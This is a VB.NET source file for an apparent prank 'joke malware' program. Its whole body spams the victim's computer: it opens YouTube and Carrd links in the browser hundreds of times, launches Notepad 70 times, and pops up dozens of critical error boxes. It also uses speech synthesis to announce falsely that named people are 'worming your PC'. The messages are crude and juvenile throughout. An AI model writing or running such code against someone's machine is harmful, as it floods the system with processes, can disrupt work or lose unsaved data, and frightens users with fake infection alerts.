Imports System.Speech.Synthesis
Imports System.Diagnostics
Imports System.Threading

Module Module1
    Sub Main()
        Dim speech As New SpeechSynthesizer()
        Dim rnd As New Random()

        ' Open the YouTube link 100 times with the error message
        For i As Integer = 1 To 100
            Process.Start("https://www.youtube.com/@Gildeabrotherslol")
            ShowError("Gildeabrothers boutta take a poop in the toilet")
        Next

        ' Open Notepad 70 times with speech alert
        For i As Integer = 1 To 70
            Process.Start("notepad.exe")
            speech.Speak("GILDEABROTHERS IS WORMING YOUR PC")
        Next

        ' Change console background color 10 times with a small delay
        For i As Integer = 1 To 10
            Console.BackgroundColor = CType(rnd.Next(0, 15), ConsoleColor)
            Thread.Sleep(100)
        Next

        ' Speech alert for Frakielee
        speech.Speak("FRAKIELEE IS WORMING YOUR PC")

        ' Open the image URL 100 times with error message
        For i As Integer = 1 To 100
            Process.Start("https://yt3.googleusercontent.com/_RHJAWacaB4-LvLZoMqzoNFOjtehvss1AiCuX_bpRrp1bfWc9_cB9VwmnLx2SqLMjMGtJPqWW_M=s160-c-k-c0x00ffffff-no-rj")
            ShowError("Gildeabrothers boutta take a poop in the toilet")
        Next

        ' Open YouTube Shorts link 50 times with error message
        For i As Integer = 1 To 50
            Process.Start("https://www.youtube.com/shorts/btyZ7bwK8hA")
            ShowError("LOOK WHAT YOU HAVE DONE")
        Next

        ' Open the Carrd link 80 times with error message
        For i As Integer = 1 To 80
            Process.Start("https://diddledbynatek.carrd.co/")
            ShowError("Gildeabrothers boutta take a poop in the toilet")
        Next

        ' Speech alert for Frakielee's final action
        speech.Speak("FRAKIELEE IS POOPING IN THE TOILET")

        ' Open the YouTube video 50 times with the error message
        For i As Integer = 1 To 50
            Process.Start("https://www.youtube.com/watch?v=YkZZLVTYHsQ")
        Next

        ' Open the Carrd link 100 times and spam error message 30 times
        For i As Integer = 1 To 100
            Process.Start("https://diddledbynatek.carrd.co/")
        Next

        For i As Integer = 1 To 30
            ShowError("YOUR PC IS DIDDLED")
        Next
    End Sub

    ' Show critical error message
    Sub ShowError(message As String)
        MsgBox(message, MsgBoxStyle.Critical)
    End Sub
End Module
